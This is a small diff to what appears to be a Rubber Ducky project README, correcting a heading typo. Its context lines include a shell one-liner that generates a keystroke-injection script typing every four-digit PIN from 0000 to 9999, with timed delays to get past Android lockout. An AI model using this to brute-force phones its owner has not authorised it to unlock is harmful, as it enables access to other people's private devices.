@@ -16,7 +16,7 @@ java -jar /Volumes/USB-Blanca/Hak5/RubberDucky/ducky/duckencode.jar -i helloworl
 ```
 port install gsed
 ```
-## Create Dictrionary 
+## Create Dictionary 
 ``` 
 echo DELAY 5000 > android_brute-force_0000-9999.txt; echo {0000..9999} | xargs -n 1 echo STRING | gsed '0~5 s/$/\nWAIT/g' | gsed '0~1 s/$/\nDELAY 1000\nENTER\nENTER/g' | gsed 's/WAIT/DELAY 5000\nENTER\nDELAY 5000\nENTER\nDELAY 5000\nENTER\nDELAY 5000\nENTER/g' >> android_brute-force_0000-9999.txt
 ```
